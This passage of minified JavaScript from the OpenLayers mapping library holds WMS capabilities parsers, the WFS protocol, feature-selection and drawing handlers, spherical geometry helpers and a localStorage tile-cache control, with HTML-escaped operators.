!0}}},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1"});OpenLayers.Format.WMSCapabilities.v1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,{readers:{wms:OpenLayers.Util.applyDefaults({WMT_MS_Capabilities:function(a,b){this.readChildNodes(a,b)},Keyword:function(a,b){b.keywords&amp;&amp;b.keywords.push(this.getChildValue(a))},DescribeLayer:function(a,b){b.describelayer={formats:[]};this.readChildNodes(a,b.describelayer)},GetLegendGraphic:function(a,b){b.getlegendgraphic={formats:[]};this.readChildNodes(a,b.getlegendgraphic)},GetStyles:function(a,b){b.getstyles= {formats:[]};this.readChildNodes(a,b.getstyles)},PutStyles:function(a,b){b.putstyles={formats:[]};this.readChildNodes(a,b.putstyles)},UserDefinedSymbolization:function(a,b){var c={supportSLD:1==parseInt(a.getAttribute("SupportSLD")),userLayer:1==parseInt(a.getAttribute("UserLayer")),userStyle:1==parseInt(a.getAttribute("UserStyle")),remoteWFS:1==parseInt(a.getAttribute("RemoteWFS"))};b.userSymbols=c},LatLonBoundingBox:function(a,b){b.llbbox=[parseFloat(a.getAttribute("minx")),parseFloat(a.getAttribute("miny")), parseFloat(a.getAttribute("maxx")),parseFloat(a.getAttribute("maxy"))]},BoundingBox:function(a,b){var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this,[a,b]);c.srs=a.getAttribute("SRS");b.bbox[c.srs]=c},ScaleHint:function(a,b){var c=a.getAttribute("min"),d=a.getAttribute("max"),e=Math.pow(2,0.5),f=OpenLayers.INCHES_PER_UNIT.m;0!=c&amp;&amp;(b.maxScale=parseFloat((c/e*f*OpenLayers.DOTS_PER_INCH).toPrecision(13)));d!=Number.POSITIVE_INFINITY&amp;&amp;(b.minScale=parseFloat((d/e*f* OpenLayers.DOTS_PER_INCH).toPrecision(13)))},Dimension:function(a,b){var c={name:a.getAttribute("name").toLowerCase(),units:a.getAttribute("units"),unitsymbol:a.getAttribute("unitSymbol")};b.dimensions[c.name]=c},Extent:function(a,b){var c=a.getAttribute("name").toLowerCase();if(c in b.dimensions){c=b.dimensions[c];c.nearestVal="1"===a.getAttribute("nearestValue");c.multipleVal="1"===a.getAttribute("multipleValues");c.current="1"===a.getAttribute("current");c["default"]=a.getAttribute("default")|| "";var d=this.getChildValue(a);c.values=d.split(",")}}},OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1"});OpenLayers.Format.WMSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,{version:"1.1.0",readers:{wms:OpenLayers.Util.applyDefaults({SRS:function(a,b){for(var c=this.getChildValue(a).split(/ +/),d=0,e=c.length;d&lt;e;d++)b.srs[c[d]]=!0}},OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_0"});OpenLayers.Protocol.WFS.v1=OpenLayers.Class(OpenLayers.Protocol,{version:null,srsName:"EPSG:4326",featureType:null,featureNS:null,geometryName:"the_geom",schema:null,featurePrefix:"feature",formatOptions:null,readFormat:null,readOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=OpenLayers.Format.WFST(OpenLayers.Util.extend({version:this.version,featureType:this.featureType,featureNS:this.featureNS,featurePrefix:this.featurePrefix,geometryName:this.geometryName, srsName:this.srsName,schema:this.schema},this.formatOptions)));!a.geometryName&amp;&amp;1&lt;parseFloat(this.format.version)&amp;&amp;this.setGeometryName(null)},destroy:function(){this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,this.options||{});var b=new OpenLayers.Protocol.Response({requestType:"read"}), c=OpenLayers.Format.XML.prototype.write.apply(this.format,[this.format.writeNode("wfs:GetFeature",a)]);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c});return b},setFeatureType:function(a){this.featureType=a;this.format.featureType=a},setGeometryName:function(a){this.geometryName=a;this.format.geometryName=a},handleRead:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);if(b.callback){var c= a.priv;200&lt;=c.status&amp;&amp;300>c.status?(c=this.parseResponse(c,b.readOptions))&amp;&amp;!1!==c.success?(b.readOptions&amp;&amp;"object"==b.readOptions.output?OpenLayers.Util.extend(a,c):a.features=c,a.code=OpenLayers.Protocol.Response.SUCCESS):(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)}},parseResponse:function(a,b){var c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);if(!c||0>=c.length)return null;c=null!==this.readFormat?this.readFormat.read(c): this.format.read(c,b);if(!this.featureNS){var d=this.readFormat||this.format;this.featureNS=d.featureNS;d.autoConfig=!1;this.geometryName||this.setGeometryName(d.geometryName)}return c},commit:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response({requestType:"commit",reqFeatures:a});c.priv=OpenLayers.Request.POST({url:b.url,headers:b.headers,data:this.format.write(a,b),callback:this.createCallback(this.handleCommit,c,b)}); return c},handleCommit:function(a,b){if(b.callback){var c=a.priv,d=c.responseXML;d&amp;&amp;d.documentElement||(d=c.responseText);c=this.format.read(d)||{};a.insertIds=c.insertIds||[];c.success?a.code=OpenLayers.Protocol.Response.SUCCESS:(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c);b.callback.call(b.scope,a)}},filterDelete:function(a,b){b=OpenLayers.Util.extend({},b);OpenLayers.Util.applyDefaults(b,this.options);new OpenLayers.Protocol.Response({requestType:"commit"});var c=this.format.createElementNSPlus("wfs:Transaction", {attributes:{service:"WFS",version:this.version}}),d=this.format.createElementNSPlus("wfs:Delete",{attributes:{typeName:(b.featureNS?this.featurePrefix+":":"")+b.featureType}});b.featureNS&amp;&amp;d.setAttribute("xmlns:"+this.featurePrefix,b.featureNS);var e=this.format.writeNode("ogc:Filter",a);d.appendChild(e);c.appendChild(d);c=OpenLayers.Format.XML.prototype.write.apply(this.format,[c]);return OpenLayers.Request.POST({url:this.url,callback:b.callback||function(){},data:c})},abort:function(a){a&amp;&amp;a.priv.abort()}, CLASS_NAME:"OpenLayers.Protocol.WFS.v1"});OpenLayers.Handler.Feature=OpenLayers.Class(OpenLayers.Handler,{EVENTMAP:{click:{"in":"click",out:"clickout"},mousemove:{"in":"over",out:"out"},dblclick:{"in":"dblclick",out:null},mousedown:{"in":null,out:null},mouseup:{"in":null,out:null},touchstart:{"in":"click",out:"clickout"}},feature:null,lastFeature:null,down:null,up:null,clickTolerance:4,geometryTypes:null,stopClick:!0,stopDown:!0,stopUp:!1,initialize:function(a,b,c,d){OpenLayers.Handler.prototype.initialize.apply(this,[a,c,d]);this.layer= b},touchstart:function(a){this.startTouch();return OpenLayers.Event.isMultiTouch(a)?!0:this.mousedown(a)},touchmove:function(a){OpenLayers.Event.preventDefault(a)},mousedown:function(a){if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.down=a.xy;return this.handle(a)?!this.stopDown:!0},mouseup:function(a){this.up=a.xy;return this.handle(a)?!this.stopUp:!0},click:function(a){return this.handle(a)?!this.stopClick:!0},mousemove:function(a){if(!this.callbacks.over&amp;&amp;!this.callbacks.out)return!0; this.handle(a);return!0},dblclick:function(a){return!this.handle(a)},geometryTypeMatches:function(a){return null==this.geometryTypes||-1&lt;OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME)},handle:function(a){this.feature&amp;&amp;!this.feature.layer&amp;&amp;(this.feature=null);var b=a.type,c=!1,d=!!this.feature,e="click"==b||"dblclick"==b||"touchstart"==b;(this.feature=this.layer.getFeatureFromEvent(a))&amp;&amp;!this.feature.layer&amp;&amp;(this.feature=null);this.lastFeature&amp;&amp;!this.lastFeature.layer&amp;&amp;(this.lastFeature= null);this.feature?("touchstart"===b&amp;&amp;OpenLayers.Event.preventDefault(a),a=this.feature!=this.lastFeature,this.geometryTypeMatches(this.feature)?(d&amp;&amp;a?(this.lastFeature&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]),this.triggerCallback(b,"in",[this.feature])):d&amp;&amp;!e||this.triggerCallback(b,"in",[this.feature]),this.lastFeature=this.feature,c=!0):(this.lastFeature&amp;&amp;(d&amp;&amp;a||e)&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]),this.feature=null)):this.lastFeature&amp;&amp;(d||e)&amp;&amp;this.triggerCallback(b,"out", [this.lastFeature]);return c},triggerCallback:function(a,b,c){if(b=this.EVENTMAP[a][b])"click"==a&amp;&amp;this.up&amp;&amp;this.down?(Math.sqrt(Math.pow(this.up.x-this.down.x,2)+Math.pow(this.up.y-this.down.y,2))&lt;=this.clickTolerance&amp;&amp;this.callback(b,c),this.up=this.down=null):this.callback(b,c)},activate:function(){var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.moveLayerToTop(),this.map.events.on({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),a=!0); return a},deactivate:function(){var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.moveLayerBack(),this.up=this.down=this.lastFeature=this.feature=null,this.map.events.un({removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this}),a=!0);return a},handleMapEvents:function(a){"removelayer"!=a.type&amp;&amp;"order"!=a.property||this.moveLayerToTop()},moveLayerToTop:function(){var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)}, moveLayerBack:function(){var a=this.layer.getZIndex()-1;a>=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))},CLASS_NAME:"OpenLayers.Handler.Feature"});OpenLayers.Layer.Vector.RootContainer=OpenLayers.Class(OpenLayers.Layer.Vector,{displayInLayerSwitcher:!1,layers:null,display:function(){},getFeatureFromEvent:function(a){for(var b=this.layers,c,d=0;d&lt;b.length;d++)if(c=b[d].getFeatureFromEvent(a))return c},setMap:function(a){OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);this.collectRoots();a.events.register("changelayer",this,this.handleChangeLayer)},removeMap:function(a){a.events.unregister("changelayer",this,this.handleChangeLayer); this.resetRoots();OpenLayers.Layer.Vector.prototype.removeMap.apply(this,arguments)},collectRoots:function(){for(var a,b=0;b&lt;this.map.layers.length;++b)a=this.map.layers[b],-1!=OpenLayers.Util.indexOf(this.layers,a)&amp;&amp;a.renderer.moveRoot(this.renderer)},resetRoots:function(){for(var a,b=0;b&lt;this.layers.length;++b)a=this.layers[b],this.renderer&amp;&amp;a.renderer.getRenderLayerId()==this.id&amp;&amp;this.renderer.moveRoot(a.renderer)},handleChangeLayer:function(a){var b=a.layer;"order"==a.property&amp;&amp;-1!=OpenLayers.Util.indexOf(this.layers, b)&amp;&amp;(this.resetRoots(),this.collectRoots())},CLASS_NAME:"OpenLayers.Layer.Vector.RootContainer"});OpenLayers.Control.SelectFeature=OpenLayers.Class(OpenLayers.Control,{multipleKey:null,toggleKey:null,multiple:!1,clickout:!0,toggle:!1,hover:!1,highlightOnly:!1,box:!1,onBeforeSelect:function(){},onSelect:function(){},onUnselect:function(){},scope:null,geometryTypes:null,layer:null,layers:null,callbacks:null,selectStyle:null,renderIntent:"select",handlers:null,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);null===this.scope&amp;&amp;(this.scope=this);this.initLayer(a);var c= {click:this.clickFeature,clickout:this.clickoutFeature};this.hover&amp;&amp;(c.over=this.overFeature,c.out=this.outFeature);this.callbacks=OpenLayers.Util.extend(c,this.callbacks);this.handlers={feature:new OpenLayers.Handler.Feature(this,this.layer,this.callbacks,{geometryTypes:this.geometryTypes})};this.box&amp;&amp;(this.handlers.box=new OpenLayers.Handler.Box(this,{done:this.selectBox},{boxDivClassName:"olHandlerBoxSelectFeature"}))},initLayer:function(a){OpenLayers.Util.isArray(a)?(this.layers=a,this.layer= new OpenLayers.Layer.Vector.RootContainer(this.id+"_container",{layers:a})):this.layer=a},destroy:function(){this.active&amp;&amp;this.layers&amp;&amp;this.map.removeLayer(this.layer);OpenLayers.Control.prototype.destroy.apply(this,arguments);this.layers&amp;&amp;this.layer.destroy()},activate:function(){this.active||(this.layers&amp;&amp;this.map.addLayer(this.layer),this.handlers.feature.activate(),this.box&amp;&amp;this.handlers.box&amp;&amp;this.handlers.box.activate());return OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.active&amp;&amp; (this.handlers.feature.deactivate(),this.handlers.box&amp;&amp;this.handlers.box.deactivate(),this.layers&amp;&amp;this.map.removeLayer(this.layer));return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},unselectAll:function(a){var b=this.layers||[this.layer],c,d,e,f;for(e=0;e&lt;b.length;++e)if(c=b[e],f=0,null!=c.selectedFeatures)for(;c.selectedFeatures.length>f;)d=c.selectedFeatures[f],a&amp;&amp;a.except==d?++f:this.unselect(d)},clickFeature:function(a){this.hover||(-1&lt;OpenLayers.Util.indexOf(a.layer.selectedFeatures, a)?this.toggleSelect()?this.unselect(a):this.multipleSelect()||this.unselectAll({except:a}):(this.multipleSelect()||this.unselectAll({except:a}),this.select(a)))},multipleSelect:function(){return this.multiple||this.handlers.feature.evt&amp;&amp;this.handlers.feature.evt[this.multipleKey]},toggleSelect:function(){return this.toggle||this.handlers.feature.evt&amp;&amp;this.handlers.feature.evt[this.toggleKey]},clickoutFeature:function(a){!this.hover&amp;&amp;this.clickout&amp;&amp;this.unselectAll()},overFeature:function(a){var b= a.layer;this.hover&amp;&amp;(this.highlightOnly?this.highlight(a):-1==OpenLayers.Util.indexOf(b.selectedFeatures,a)&amp;&amp;this.select(a))},outFeature:function(a){if(this.hover)if(this.highlightOnly){if(a._lastHighlighter==this.id)if(a._prevHighlighter&amp;&amp;a._prevHighlighter!=this.id){delete a._lastHighlighter;var b=this.map.getControl(a._prevHighlighter);b&amp;&amp;b.highlight(a)}else this.unhighlight(a)}else this.unselect(a)},highlight:function(a){var b=a.layer;!1!==this.events.triggerEvent("beforefeaturehighlighted",{feature:a})&amp;&amp; (a._prevHighlighter=a._lastHighlighter,a._lastHighlighter=this.id,b.drawFeature(a,this.selectStyle||this.renderIntent),this.events.triggerEvent("featurehighlighted",{feature:a}))},unhighlight:function(a){var b=a.layer;void 0==a._prevHighlighter?delete a._lastHighlighter:(a._prevHighlighter!=this.id&amp;&amp;(a._lastHighlighter=a._prevHighlighter),delete a._prevHighlighter);b.drawFeature(a,a.style||a.layer.style||"default");this.events.triggerEvent("featureunhighlighted",{feature:a})},select:function(a){var b= this.onBeforeSelect.call(this.scope,a),c=a.layer;!1!==b&amp;&amp;(b=c.events.triggerEvent("beforefeatureselected",{feature:a}),!1!==b&amp;&amp;(c.selectedFeatures.push(a),this.highlight(a),this.handlers.feature.lastFeature||(this.handlers.feature.lastFeature=c.selectedFeatures[0]),c.events.triggerEvent("featureselected",{feature:a}),this.onSelect.call(this.scope,a)))},unselect:function(a){var b=a.layer;this.unhighlight(a);OpenLayers.Util.removeItem(b.selectedFeatures,a);b.events.triggerEvent("featureunselected", {feature:a});this.onUnselect.call(this.scope,a)},selectBox:function(a){if(a instanceof OpenLayers.Bounds){var b=this.map.getLonLatFromPixel({x:a.left,y:a.bottom});a=this.map.getLonLatFromPixel({x:a.right,y:a.top});b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);this.multipleSelect()||this.unselectAll();a=this.multiple;this.multiple=!0;var c=this.layers||[this.layer];this.events.triggerEvent("boxselectionstart",{layers:c});for(var d,e=0;e&lt;c.length;++e){d=c[e];for(var f=0,g=d.features.length;f&lt;g;++f){var h= d.features[f];h.getVisibility()&amp;&amp;(null==this.geometryTypes||-1&lt;OpenLayers.Util.indexOf(this.geometryTypes,h.geometry.CLASS_NAME))&amp;&amp;b.toGeometry().intersects(h.geometry)&amp;&amp;-1==OpenLayers.Util.indexOf(d.selectedFeatures,h)&amp;&amp;this.select(h)}}this.multiple=a;this.events.triggerEvent("boxselectionend",{layers:c})}},setMap:function(a){this.handlers.feature.setMap(a);this.box&amp;&amp;this.handlers.box.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},setLayer:function(a){var b=this.active;this.unselectAll(); this.deactivate();this.layers&amp;&amp;(this.layer.destroy(),this.layers=null);this.initLayer(a);this.handlers.feature.layer=this.layer;b&amp;&amp;this.activate()},CLASS_NAME:"OpenLayers.Control.SelectFeature"});OpenLayers.Handler.Point=OpenLayers.Class(OpenLayers.Handler,{point:null,layer:null,multi:!1,citeCompliant:!1,mouseDown:!1,stoppedDown:null,lastDown:null,lastUp:null,persist:!1,stopDown:!1,stopUp:!1,layerOptions:null,pixelTolerance:5,lastTouchPx:null,initialize:function(a,b,c){c&amp;&amp;c.layerOptions&amp;&amp;c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style["default"],{}));OpenLayers.Handler.prototype.initialize.apply(this,arguments)},activate:function(){if(!OpenLayers.Handler.prototype.activate.apply(this, arguments))return!1;var a=OpenLayers.Util.extend({displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant},this.layerOptions);this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a);this.map.addLayer(this.layer);return!0},createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.callback("create",[this.point.geometry,this.point]);this.point.geometry.clearBounds(); this.layer.addFeatures([this.point],{silent:!0})},deactivate:function(){if(!OpenLayers.Handler.prototype.deactivate.apply(this,arguments))return!1;this.cancel();null!=this.layer.map&amp;&amp;(this.destroyFeature(!0),this.layer.destroy(!1));this.layer=null;return!0},destroyFeature:function(a){!this.layer||!a&amp;&amp;this.persist||this.layer.destroyFeatures();this.point=null},destroyPersistedFeature:function(){var a=this.layer;a&amp;&amp;1&lt;a.features.length&amp;&amp;this.layer.features[0].destroy()},finalize:function(a){this.mouseDown= !1;this.lastTouchPx=this.lastUp=this.lastDown=null;this.callback(a?"cancel":"done",[this.geometryClone()]);this.destroyFeature(a)},cancel:function(){this.finalize(!0)},click:function(a){OpenLayers.Event.stop(a);return!1},dblclick:function(a){OpenLayers.Event.stop(a);return!1},modifyFeature:function(a){this.point||this.createFeature(a);a=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=a.lon;this.point.geometry.y=a.lat;this.callback("modify",[this.point.geometry,this.point,!1]);this.point.geometry.clearBounds(); this.drawFeature()},drawFeature:function(){this.layer.drawFeature(this.point,this.style)},getGeometry:function(){var a=this.point&amp;&amp;this.point.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiPoint([a]));return a},geometryClone:function(){var a=this.getGeometry();return a&amp;&amp;a.clone()},mousedown:function(a){return this.down(a)},touchstart:function(a){this.startTouch();this.lastTouchPx=a.xy;return this.down(a)},mousemove:function(a){return this.move(a)},touchmove:function(a){this.lastTouchPx=a.xy; return this.move(a)},mouseup:function(a){return this.up(a)},touchend:function(a){a.xy=this.lastTouchPx;return this.up(a)},down:function(a){this.mouseDown=!0;this.lastDown=a.xy;this.touch||this.modifyFeature(a.xy);this.stoppedDown=this.stopDown;return!this.stopDown},move:function(a){this.touch||this.mouseDown&amp;&amp;!this.stoppedDown||this.modifyFeature(a.xy);return!0},up:function(a){this.mouseDown=!1;this.stoppedDown=this.stopDown;if(!this.checkModifiers(a)||this.lastUp&amp;&amp;this.lastUp.equals(a.xy)||!this.lastDown|| !this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance))return!0;this.touch&amp;&amp;this.modifyFeature(a.xy);this.persist&amp;&amp;this.destroyPersistedFeature();this.lastUp=a.xy;this.finalize();return!this.stopUp},mouseout:function(a){OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&amp;&amp;(this.stoppedDown=this.stopDown,this.mouseDown=!1)},passesTolerance:function(a,b,c){var d=!0;null!=c&amp;&amp;a&amp;&amp;b&amp;&amp;a.distanceTo(b)>c&amp;&amp;(d=!1);return d},CLASS_NAME:"OpenLayers.Handler.Point"});OpenLayers.Handler.Path=OpenLayers.Class(OpenLayers.Handler.Point,{line:null,maxVertices:null,doubleTouchTolerance:20,freehand:!1,freehandToggle:"shiftKey",timerId:null,redoStack:null,createFeature:function(a){a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([this.point.geometry]));this.callback("create",[this.point.geometry,this.getSketch()]); this.point.geometry.clearBounds();this.layer.addFeatures([this.line,this.point],{silent:!0})},destroyFeature:function(a){OpenLayers.Handler.Point.prototype.destroyFeature.call(this,a);this.line=null},destroyPersistedFeature:function(){var a=this.layer;a&amp;&amp;2&lt;a.features.length&amp;&amp;this.layer.features[0].destroy()},removePoint:function(){this.point&amp;&amp;this.layer.removeFeatures([this.point])},addPoint:function(a){this.layer.removeFeatures([this.point]);a=this.layer.getLonLatFromViewPortPx(a);this.point=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a.lon, a.lat));this.line.geometry.addComponent(this.point.geometry,this.line.geometry.components.length);this.layer.addFeatures([this.point]);this.callback("point",[this.point.geometry,this.getGeometry()]);this.callback("modify",[this.point.geometry,this.getSketch()]);this.drawFeature();delete this.redoStack},insertXY:function(a,b){this.line.geometry.addComponent(new OpenLayers.Geometry.Point(a,b),this.getCurrentPointIndex());this.drawFeature();delete this.redoStack},insertDeltaXY:function(a,b){var c=this.getCurrentPointIndex()- 1,c=this.line.geometry.components[c];!c||(isNaN(c.x)||isNaN(c.y))||this.insertXY(c.x+a,c.y+b)},insertDirectionLength:function(a,b){a*=Math.PI/180;var c=b*Math.cos(a),d=b*Math.sin(a);this.insertDeltaXY(c,d)},insertDeflectionLength:function(a,b){var c=this.getCurrentPointIndex()-1;if(0&lt;c){var d=this.line.geometry.components[c],c=this.line.geometry.components[c-1],d=Math.atan2(d.y-c.y,d.x-c.x);this.insertDirectionLength(180*d/Math.PI+a,b)}},getCurrentPointIndex:function(){return this.line.geometry.components.length- 1},undo:function(){var a=this.line.geometry,b=a.components,c=this.getCurrentPointIndex()-1,d=b[c],e=a.removeComponent(d);e&amp;&amp;(this.touch&amp;&amp;0&lt;c&amp;&amp;(b=a.components,a=b[c-1],c=this.getCurrentPointIndex(),b=b[c],b.x=a.x,b.y=a.y),this.redoStack||(this.redoStack=[]),this.redoStack.push(d),this.drawFeature());return e},redo:function(){var a=this.redoStack&amp;&amp;this.redoStack.pop();a&amp;&amp;(this.line.geometry.addComponent(a,this.getCurrentPointIndex()),this.drawFeature());return!!a},freehandMode:function(a){return this.freehandToggle&amp;&amp; a[this.freehandToggle]?!this.freehand:this.freehand},modifyFeature:function(a,b){this.line||this.createFeature(a);var c=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=c.lon;this.point.geometry.y=c.lat;this.callback("modify",[this.point.geometry,this.getSketch(),b]);this.point.geometry.clearBounds();this.drawFeature()},drawFeature:function(){this.layer.drawFeature(this.line,this.style);this.layer.drawFeature(this.point,this.style)},getSketch:function(){return this.line},getGeometry:function(){var a= this.line&amp;&amp;this.line.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiLineString([a]));return a},touchstart:function(a){if(this.timerId&amp;&amp;this.passesTolerance(this.lastTouchPx,a.xy,this.doubleTouchTolerance))return this.finishGeometry(),window.clearTimeout(this.timerId),this.timerId=null,!1;this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null);this.timerId=window.setTimeout(OpenLayers.Function.bind(function(){this.timerId=null},this),300);return OpenLayers.Handler.Point.prototype.touchstart.call(this, a)},down:function(a){var b=this.stopDown;this.freehandMode(a)&amp;&amp;(b=!0,this.touch&amp;&amp;(this.modifyFeature(a.xy,!!this.lastUp),OpenLayers.Event.stop(a)));this.touch||this.lastDown&amp;&amp;this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)||this.modifyFeature(a.xy,!!this.lastUp);this.mouseDown=!0;this.lastDown=a.xy;this.stoppedDown=b;return!b},move:function(a){if(this.stoppedDown&amp;&amp;this.freehandMode(a))return this.persist&amp;&amp;this.destroyPersistedFeature(),this.maxVertices&amp;&amp;this.line&amp;&amp;this.line.geometry.components.length=== this.maxVertices?(this.removePoint(),this.finalize()):this.addPoint(a.xy),!1;this.touch||this.mouseDown&amp;&amp;!this.stoppedDown||this.modifyFeature(a.xy,!!this.lastUp);return!0},up:function(a){!this.mouseDown||this.lastUp&amp;&amp;this.lastUp.equals(a.xy)||(this.stoppedDown&amp;&amp;this.freehandMode(a)?(this.persist&amp;&amp;this.destroyPersistedFeature(),this.removePoint(),this.finalize()):this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)&amp;&amp;(this.touch&amp;&amp;this.modifyFeature(a.xy),null==this.lastUp&amp;&amp;this.persist&amp;&amp;this.destroyPersistedFeature(), this.addPoint(a.xy),this.lastUp=a.xy,this.line.geometry.components.length===this.maxVertices+1&amp;&amp;this.finishGeometry()));this.stoppedDown=this.stopDown;this.mouseDown=!1;return!this.stopUp},finishGeometry:function(){this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components.length-1]);this.removePoint();this.finalize()},dblclick:function(a){this.freehandMode(a)||this.finishGeometry();return!1},CLASS_NAME:"OpenLayers.Handler.Path"});OpenLayers.Spherical=OpenLayers.Spherical||{};OpenLayers.Spherical.DEFAULT_RADIUS=6378137;OpenLayers.Spherical.computeDistanceBetween=function(a,b,c){c=c||OpenLayers.Spherical.DEFAULT_RADIUS;var d=Math.sin(Math.PI*(b.lon-a.lon)/360),e=Math.sin(Math.PI*(b.lat-a.lat)/360);a=e*e+d*d*Math.cos(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180);return 2*c*Math.atan2(Math.sqrt(a),Math.sqrt(1-a))}; OpenLayers.Spherical.computeHeading=function(a,b){var c=Math.sin(Math.PI*(a.lon-b.lon)/180)*Math.cos(Math.PI*b.lat/180),d=Math.cos(Math.PI*a.lat/180)*Math.sin(Math.PI*b.lat/180)-Math.sin(Math.PI*a.lat/180)*Math.cos(Math.PI*b.lat/180)*Math.cos(Math.PI*(a.lon-b.lon)/180);return 180*Math.atan2(c,d)/Math.PI};OpenLayers.Control.CacheWrite=OpenLayers.Class(OpenLayers.Control,{layers:null,imageFormat:"image/png",quotaRegEx:/quota/i,setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);var b,c=this.layers||a.layers;for(b=c.length-1;0&lt;=b;--b)this.addLayer({layer:c[b]});if(!this.layers)a.events.on({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this})},addLayer:function(a){a.layer.events.on({tileloadstart:this.makeSameOrigin,tileloaded:this.onTileLoaded,scope:this})},removeLayer:function(a){a.layer.events.un({tileloadstart:this.makeSameOrigin, tileloaded:this.onTileLoaded,scope:this})},makeSameOrigin:function(a){if(this.active&amp;&amp;(a=a.tile,a instanceof OpenLayers.Tile.Image&amp;&amp;!a.crossOriginKeyword&amp;&amp;"data:"!==a.url.substr(0,5))){var b=OpenLayers.Request.makeSameOrigin(a.url,OpenLayers.ProxyHost);OpenLayers.Control.CacheWrite.urlMap[b]=a.url;a.url=b}},onTileLoaded:function(a){this.active&amp;&amp;(!a.aborted&amp;&amp;a.tile instanceof OpenLayers.Tile.Image&amp;&amp;"data:"!==a.tile.url.substr(0,5))&amp;&amp;(this.cache({tile:a.tile}),delete OpenLayers.Control.CacheWrite.urlMap[a.tile.url])}, cache:function(a){if(window.localStorage){a=a.tile;try{var b=a.getCanvasContext();b&amp;&amp;window.localStorage.setItem("olCache_"+(OpenLayers.Control.CacheWrite.urlMap[a.url]||a.url),b.canvas.toDataURL(this.imageFormat))}catch(c){(b=c.name||c.message)&amp;&amp;this.quotaRegEx.test(b)?this.events.triggerEvent("cachefull",{tile:a}):OpenLayers.Console.error(c.toString())}}},destroy:function(){if(this.layers||this.map){var a,b=this.layers||this.map.layers;for(a=b.length-1;0&lt;=a;--a)this.removeLayer({layer:b[a]})}this.map&amp;&amp; this.map.events.un({addlayer:this.addLayer,removeLayer:this.removeLayer,scope:this});OpenLayers.Control.prototype.destroy.apply(this,arguments)},CLASS_NAME:"OpenLayers.Control.CacheWrite"});OpenLayers.Control.CacheWrite.clearCache=function(){if(window.localStorage){var a,b;for(a=window.localStorage.length-1;0&lt;=a;--a)b=window.localStorage.key(a),"olCache_"===b.substr(0,8)&amp;&amp;window.localStorage.removeItem(b)}};OpenLayers.Control.CacheWrite.urlMap={};OpenLayers.Format.Context=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,{layerOptions:null,layerParams:null,read:function(a,b){var c=OpenLayers.Format.XML.VersionedOGC.prototype.read.apply(this,arguments);if(b&amp;&amp;b.map)if(this.context=c,b.map instanceof OpenLayers.Map)c=this.mergeContextToMap(c,b.map);else{var d=b.map;if(OpenLayers.Util.isElement(d)||"string"==typeof d)d={div:d};c=this.contextToMap(c,d)}return c},getLayerFromContext:function(a){var 